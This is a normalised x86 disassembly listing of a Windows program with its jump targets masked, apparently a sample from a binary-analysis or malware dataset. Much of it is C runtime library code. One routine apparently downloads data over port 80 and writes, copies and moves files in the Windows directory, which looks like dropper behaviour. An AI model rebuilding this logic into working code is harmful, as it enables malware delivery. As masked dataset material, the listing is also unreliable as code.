pop edi
pop esi
pop ebp
pop ebx
add esp 0x8c
retn
test ebp ebp
je r-xdata
lea edi [ ebp + 0x2 ]
push 0xd
push edi
call sub_4092f0
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
lea esi [ esp + 0x1c ]
mov ecx edi
mov [ ebp ] 0x0
sbb ecx ecx
sbb ecx 0xffffffff
test dl dl
je r-xdata
mov [ esp + 0x14 ] 0x1
mov ecx [ esp + 0x10 ]
add ecx ebx
cmp ebp ecx
jb r-xdata
xor ecx ecx
jmp r-xdata
mov al [ ecx + 0x1 ]
mov dl al
cmp al [ esi + 0x1 ]
jne r-xdata
jmp r-xdata
test ecx ecx
je r-xdata
add ecx 0x2
add esi 0x2
test dl dl
jne r-xdata
mov al [ ecx ]
mov dl al
cmp al [ esi ]
jne r-xdata
sub_408820
sub esp 0x210
push ebx
push esi
push edi
push 0x3e800
call sub_408e82
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x210
retn
mov ecx [ esp + 0x220 ]
lea eax [ esp + 0xc ]
push 0x0
push eax
push ebx
push 0x0
push rw-data
push ecx
push 0x50
push rw-data
call sub_402b30
add esp 0x20
test eax eax
je r-xdata
push ebx
call sub_4091a9
add esp 0x4
push ebp
mov ebp [ GetWindowsDirectoryA@IAT ]
lea edx [ esp + 0x11c ]
push 0x104
push edx
call ebp
mov edi [ esp + 0x228 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x11c ]
[ edi ]
not ecx
sub edi ecx
push 0x104
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x1c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call ebp
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
push 0x20
push 0x2
mov ecx ebp
push eax
push eax
and ecx 0x3
lea eax [ esp + 0x2c ]
push 0x40000000
[ edi ] [ esi ]
push eax
call [ CreateFileA@IAT ]
mov esi eax
pop ebp
cmp esi 0xffffffff
je r-xdata
mov edx [ esp + 0xc ]
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
push edx
push ebx
push esi
call [ WriteFile@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
push ebx
call sub_4091a9
add esp 0x4
test edi edi
je r-xdata
lea eax [ esp + 0x14 ]
push eax
call sub_407e40
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x118 ]
push 0x0
lea ecx [ esp + 0x18 ]
push eax
push ecx
call [ CopyFileA@IAT ]
lea ecx [ esp + 0x118 ]
lea edx [ esp + 0x14 ]
push ecx
push edx
call sub_407ee0
add esp 0x8
jmp r-xdata
lea ecx [ esp + 0x118 ]
push ecx
call sub_406f20
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebx
add esp 0x210
retn
lea edx [ esp + 0x14 ]
push edx
call [ DeleteFileA@IAT ]
lea eax [ esp + 0x118 ]
push eax
call sub_4086b0
add esp 0x4
test eax eax
je r-xdata
sub_4089e0
push ecx
push ebp
push edi
push 0x3e800
xor ebp ebp
call sub_408e82
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
mov ecx [ esp + 0x10 ]
lea eax [ esp + 0x8 ]
push 0x0
push eax
push edi
push 0x0
push rw-data
push ecx
push 0x50
push rw-data
call sub_402b30
add esp 0x20
test eax eax
jne r-xdata
pop edi
pop ebp
pop ecx
retn
mov edx [ esp + 0x8 ]
push ebx
push esi
mov esi rw-data
mov [ edx + edi ] 0x0
mov eax edi
push edi
call sub_4091a9
add esp 0x4
xor eax eax
pop edi
pop ebp
pop ecx
retn
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push edi
call sub_4091a9
add esp 0x4
mov eax ebp
pop edi
pop ebp
pop ecx
retn
mov ebp 0x1
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
pop esi
pop ebx
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_408aae
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx - 0x4 ]
mov ebp [ ebp - 0x4 ]
jmp eax
sub_408af0
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov eax [ fs : 0x0 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and al 0xfd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_408b3f
push ebp
mov ebp esp
sub esp 0x4
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_409ab8
add esp 0x20
mov [ ebp + 0x14 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_408b75
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] sub_408bc9
inc eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_40a2c0
mov ecx eax
mov eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_408bc9
push ebp
mov ebp esp
cld
mov eax [ ebp + 0xc ]
push 0x0
push eax
push [ eax + 0x10 ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_409ab8
add esp 0x20
pop ebp
retn
sub_408bee
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_408ca2
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] r-xdata
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ rw-data ]
pop ecx
pop ecx
and [ ebp - 0x34 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
mov eax [ ebp - 0x34 ]
pop edi
pop esi
pop ebx
leave
retn
sub_408ca2
push ebp
mov ebp esp
push ebx
push esi
push edi
cld
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
test eax eax
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_409ab8
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
push 0x1
pop eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp [ ebx + 0x18 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_408af0
pop edi
pop esi
pop ebx
pop ebp
retn
sub_408d17
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ ebp + 0xc ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0xc ]
mov ebx [ edi + 0x10 ]
mov eax esi
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] eax
jl r-xdata
mov ecx [ ebp + 0x14 ]
inc esi
mov [ ecx ] esi
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp eax [ edi + 0xc ]
ja r-xdata
cmp esi 0xffffffff
jne r-xdata
call sub_40a362
cmp esi eax
jbe r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
lea eax [ esi + esi * 4 ]
cmp [ ebx + eax * 4 + 0x4 ] ecx
lea eax [ ebx + eax * 4 ]
jge r-xdata
call sub_40a362
lea eax [ esi + esi * 4 ]
pop edi
pop esi
lea eax [ ebx + eax * 4 ]
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov eax [ ebp + 0x8 ]
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov eax [ ebp - 0x4 ]
sub_408d94
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_408dd6
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_408db4
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_408e6a
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_408e94
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_408ec0
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_40a3b8
test eax eax
pop ecx
jne r-xdata
sub_408ec0
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
test esi esi
jne r-xdata
push esi
call sub_40a7a3
test eax eax
pop ecx
jne r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
push 0x1
pop esi
pop esi
retn
sub_408f1e
push ebp
mov ebp esp
sub esp 0xcc
lea eax [ ebp - 0x10 ]
push eax
call [ GetLocalTime@IAT ]
lea eax [ ebp - 0x20 ]
push eax
call [ GetSystemTime@IAT ]
mov ax [ ebp - 0x16 ]
cmp ax [ rw-data ]
jne r-xdata
lea eax [ ebp - 0xcc ]
push eax
call [ GetTimeZoneInformation@IAT ]
cmp eax 0xffffffff
je r-xdata
mov ax [ ebp - 0x18 ]
cmp ax [ rw-data ]
jne r-xdata
or eax 0xffffffff
cmp eax 0x2
jne r-xdata
mov ax [ ebp - 0x1a ]
cmp ax [ rw-data ]
jne r-xdata
leave
retn
mov [ ecx ] eax
xor eax eax
jmp r-xdata
cmp [ ebp - 0x32 ] 0x0
je r-xdata
mov ax [ ebp - 0x1e ]
cmp ax [ rw-data ]
jne r-xdata
push esi
push edi
lea esi [ ebp - 0x20 ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov [ rw-data ] eax
pop esi
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov ax [ ebp - 0x20 ]
cmp ax [ rw-data ]
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov eax [ rw-data ]
jmp r-xdata
push eax
movzx eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x10 ]
push eax
call sub_40af4e
mov ecx [ ebp + 0x8 ]
add esp 0x1c
test ecx ecx
je r-xdata
sub_409000
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
inc ecx
neg ecx
dec edi
mov al [ ebp + 0xc ]
std
[ edi ]
inc edi
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_409076
push edi
push 0x1
pop edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rw-data ] edi
mov [ rw-data ] bl
jne r-xdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rw-data
push rw-data
call sub_40910f
pop ecx
pop ecx
test ebx ebx
pop ebx
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
retn
push [ esp + 0x8 ]
mov [ rw-data ] edi
call [ ExitProcess@IAT ]
push rw-data
push rw-data
call sub_40910f
pop ecx
pop ecx
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb r-xdata
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
sub esi 0x4
cmp esi [ rw-data ]
jae r-xdata
call eax
sub_409129
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call [ MoveFileA@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
retn
push eax
call sub_40b010
pop ecx
or eax 0xffffffff
retn
test eax eax
je r-xdata
sub_409157
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x42
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_40b18c
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_40b077
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_4091a9
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push esi
call sub_40a44d
pop ecx
test eax eax
push esi
je r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push eax
call sub_40a478
pop ecx
pop ecx
pop esi
retn
sub_4091e0
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
inc edi
dec ecx
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
dec ebx
jne r-xdata
dec ebx
jne r-xdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne r-xdata
add edi 0x4
xor eax eax
dec ecx
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_4092f0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_4093b0
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
inc esi
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
inc esi
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
inc esi
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_409430
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
movzx eax [ edi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax [ edi ]
push 0x8
push eax
call sub_40b979
pop ecx
pop ecx
jmp r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2d
mov ebp esi
je r-xdata
inc edi
jmp r-xdata
test eax eax
je r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2b
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_40b979
pop ecx
pop ecx
jmp r-xdata
xor ebx ebx
cmp ebp 0x2d
mov eax ebx
jne r-xdata
lea eax [ ebx + ebx * 4 ]
lea ebx [ esi + eax * 2 - 0x30 ]
movzx esi [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
neg eax
cmp [ rw-data ] 0x1
jle r-xdata
sub_4094d0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_409500
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
xor ebx ebx
mov edi edi
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp eax ebx
je r-xdata
or ebx ebx
je r-xdata
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
push ecx
push eax
push ebx
call sub_40ba24
mov ebx eax
add esp 0x4
call sub_40ba24
add esp 0x4
pop ecx
cmp eax ebx
jne r-xdata
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
cmp ah bh
jb r-xdata
neg ecx
dec ecx
jne r-xdata
neg ecx
jmp r-xdata
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
mov al [ esi ]
or eax eax
mov bl [ edi ]
je r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
dec ecx
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_4095ad
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
mov eax [ esi + 0xc ]
test al 0x40
je r-xdata
test al 0x83
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax edi
push esi
call sub_40bc08
push esi
mov edi eax
call sub_40bba2
push [ esi + 0x10 ]
call sub_40baef
add esp 0xc
test eax eax
jge r-xdata
and [ esi + 0xc ] 0x0
pop edi
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_4091a9
and [ esi + 0x1c ] 0x0
pop ecx
sub_409603
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
test edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp + 0x8 ] ecx
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
jmp r-xdata
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test [ esi + 0xc ] 0x10c
je r-xdata
cmp ecx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_40bcda
cmp eax 0xffffffff
pop ecx
je r-xdata
cmp [ ebp + 0x14 ] 0x0
mov eax ecx
je r-xdata
cmp ecx eax
mov edi ecx
jb r-xdata
mov eax edi
xor edx edx
sub eax [ ebp + 0x8 ]
div [ ebp + 0xc ]
jmp r-xdata
mov [ ebx ] al
mov eax [ esi + 0x18 ]
inc ebx
dec [ ebp + 0x8 ]
mov [ ebp + 0x14 ] eax
push eax
push ebx
push [ esi + 0x10 ]
call sub_40bdb3
add esp 0xc
test eax eax
je r-xdata
xor edx edx
div [ ebp + 0x14 ]
mov eax ecx
sub eax edx
push edi
push [ esi ]
push ebx
call sub_40bfb0
sub [ ebp + 0x8 ] edi
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
add ebx edi
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov edi eax
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
or [ esi + 0xc ] 0x20
sub [ ebp + 0x8 ] eax
add ebx eax
jmp r-xdata
sub_4096eb
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
mov [ rw-data ] 0x16
or eax 0xffffffff
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
and al 0xef
cmp edi 0x1
mov [ esi + 0xc ] eax
jne r-xdata
cmp edi 0x1
je r-xdata
push esi
call sub_40bc08
mov eax [ esi + 0xc ]
pop ecx
test al 0x80
je r-xdata
push esi
call sub_40c37f
add [ esp + 0x14 ] eax
pop ecx
xor edi edi
cmp edi 0x2
jne r-xdata
test al 0x1
je r-xdata
and al 0xfc
mov [ esi + 0xc ] eax
jmp r-xdata
push edi
push [ esp + 0x14 ]
push [ esi + 0x10 ]
call sub_40c2e5
add esp 0xc
xor ecx ecx
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
jmp r-xdata
test al 0x8
je r-xdata
pop edi
pop esi
retn
test ah 0x4
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_4097aa
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
test edi edi
mov [ ebp + 0x8 ] eax
mov ebx edi
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
movsx eax [ eax ]
push eax
call sub_40b077
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
test ecx ecx
je r-xdata
cmp ebx eax
mov edi ebx
jb r-xdata
mov eax edi
inc [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp + 0x14 ] eax
test eax eax
jg r-xdata
